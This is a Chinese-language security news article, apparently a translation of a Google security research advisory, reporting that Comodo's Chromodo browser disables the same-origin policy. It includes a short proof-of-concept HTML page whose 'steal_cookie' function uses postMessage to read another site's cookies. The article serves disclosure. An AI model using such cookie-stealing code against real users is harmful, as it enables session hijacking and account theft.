# Chromodo浏览器禁用了同源策略，网络安全也随之消失

阅读量 **100842**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2016-02-03 15:06:36

 **x**

##### 译文声明

本文是翻译文章，文章来源：360安全播报

原文地址：<https://code.google.com/p/google-security-research/issues/detail?id=704>

译文仅供参考，具体内容表达以及含义原文为准。

Comodo（科摩多）是美国的一家软件公司，是世界优秀的IT安全服务提供商和SSL证书的供应商之一，总部设在新泽西州泽西城，成立于1998年。其产品涉及范围较广，包含数字证书，安全软件以及安全周边软件。其免费产品也很多，包括安全套装在内均有免费版。

总的来说，Comodo的产品以严谨出名，防火墙严格的设置规则受到很多用户的喜爱，但该公司的反病毒产品功能并不是很强。

当你安装了Comodo网络安全套件之后，你将发现Comodo会默认安装一款名为Chromodo的新型网页浏览器，并且还会将其设为系统的默认浏览器。除此之外，系统中所有浏览器的快捷方式都会被Chromodo的地址所替换，该浏览器还会从Chrome浏览器中导入所有的设置以及cookie文件等信息。而且浏览器还会在某些情况下劫持主机的DNS设置。

[https://www.comodo.com/home/browsers-toolbars/chromodo-private-internet-browser.php](https://www.comodo.com/home/browsers-toolbars/chromodo-private-internet-browser.php)

Comodo将Chromodo浏览器描述为－“速度最快，安全等级最高，隐私保护最全面的浏览器”。但是实际上，这款浏览器并没有给用户提供任何的网络安全保护。因为他们禁用了同源策略！

具体示例请查看以下代码：

    
    
    <html>
    <head></head>
    <body>
    <script>
    function steal_cookie(obj)
    {
        // Wait for the page to load
        setTimeout(function() {
            obj.postMessage(JSON.stringify({
                command: "execCode",
                code:    "(document.cookie)",
            }), "*");
        }, 2000);
    }
    </script>
    <a href="steal_cookie(window.open('https://ssl.comodo.com/'))">Click Here</a>
    </body>
    </html>

在此，我们将遵循90天的漏洞披露期限。如果90天之后，该公司没有提供相应的修复补丁，那么我们将会把这个漏洞的详细信息公布出来。

本文翻译自360安全播报 [原文链接](https://code.google.com/p/google-security-research/issues/detail?id=704)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **WisFree** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/83434](/post/id/83434)

安全客 - 有思想的安全新媒体

本文转载自: [360安全播报](https://code.google.com/p/google-security-research/issues/detail?id=704)

如若转载,请注明出处： <https://code.google.com/p/google-security-research/issues/detail?id=704>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __0赞

 __收藏

![](https://p5.ssl.qhimg.com/t014c3fa13dce6c85dd.png) WisFree

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

